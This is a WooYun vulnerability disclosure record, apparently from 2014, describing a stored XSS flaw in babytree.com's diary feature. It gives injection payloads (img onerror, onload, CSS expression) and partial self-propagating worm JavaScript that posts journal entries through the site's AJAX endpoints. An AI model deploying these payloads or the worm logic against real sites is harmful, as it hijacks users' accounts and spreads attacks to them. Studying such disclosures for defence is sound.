{"id": 43823, "wybug_id": "wooyun-2014-081548", "wybug_title": "Baby大型亲子门户Store XSS 蠕虫", "wybug_corp": "babytree.com", "wybug_author": "黑暗游侠", "wybug_date": "2014-11-01 20:23", "wybug_open_date": "2014-11-06 20:24", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Baby亲子门户Store XSS 蠕虫 详细说明：  Baby大型亲子门户Store  xss可大规模蠕虫，千万级用户宝宝树，Babytreewww.babytree.com权9，Alexa排名119\n\n   漏洞证明：  每个妈咪或者每个爸比注册完后都会有一个home\n\n首页也会推送写的日记，于是用户和用户的交互形成了蠕虫的先决条件之一\n\n来看下形成过程，首先呢全站的xss防御是非常完美的，经过无数次的测试，黑盒发现一处src外无过滤。首先登陆账号，点击 ”我的小家“然后选择   “ 写日记”  如图：\n\n这里可以插入图片，图片是以http完整url的形式包含到img标签下的src属性中，src属性里直接插入会被防御机制检查，但是src外可以插入属性代码执行跨站脚本。我们先来看抓包的代码\n\n如图，%22以前是基于防御沙盒进行过滤，但是%22以后沙盒竟然放弃了检查，于是修改数据包代码，在xx.jpg\"后增加以下代码，仅在IE7包括IE7以下可以执行\n+style=\"xss:expression(alert(1))\" +style=\"color:rgb(''x:expression(alert(1))\n或者在/>后面新插入img标签，通杀所有浏览器和内核版本\n<img src=\"1\" onerror=alert(1) />\n\n\n也或者%22后面加入事件代码，比如+onload=alert(1) 一样通杀所有浏览器和版本 可以看到，访问日志后全部弹出1的提示窗口=======================================================================================接下来构造蠕虫给出部分关键js代码，控制content内容，获取location的uxxxxxxx的用户识别参数，查看的用户便会主动发表一篇同样带有存储型xss的蠕虫日记，传播速度将会成指数增长，最后达到逻辑斯蒂峰值 ： \n$.ajax({        url: 'http://home.babytree.com/content/post_ajax_util.php'        type: 'post'        data: {                action: 'update'                title:'xxxx'                tags: 'tttt'                content: '%3Cp%3Effff%3C%2Fp%3E'                 dates: '2014-08-13'                cid: '46360992'                privacy: 'a'                 discuss_id: ''                 journalid: '0'                letterid: '0'                callback: 'parent.showResponse'                jhack: 'true'         }        success: function(data) {                console.log(data);                alert(data);        }});$.ajax({        url:'http://home.babytree.com/u603094999949/journal/ajax'        type: 'post'        data : {                uid: 'u603094999949'                tab: 'journal'                view: 'new'                test_home_server : 'http://home.babytree.com'                cmd: 'create'                journal_id: '0'                crumb:'8abbaf15bdf1853b0bad38d125aca167cc8ec46e'                random:'NvbjIXigM1RTUxOl1i'                callback:'parent.callback_create'                title: 'fffff'                date： '2014-08-13',                 letterid: '0',                relate_baby:['12268973']                tags: '我的标签'                category: '童言无忌'                catName: '我的自定义分类'                overall: 'open'                 nocomment: '1'        }        success: function(data) {                console.log(data);                alert(data);        }        });\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-06 20:24 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-03 23:22 |    \t\tTwoEyes \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:28        | 你看到我的小熊了吗)\t\t \n  涨姿势    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}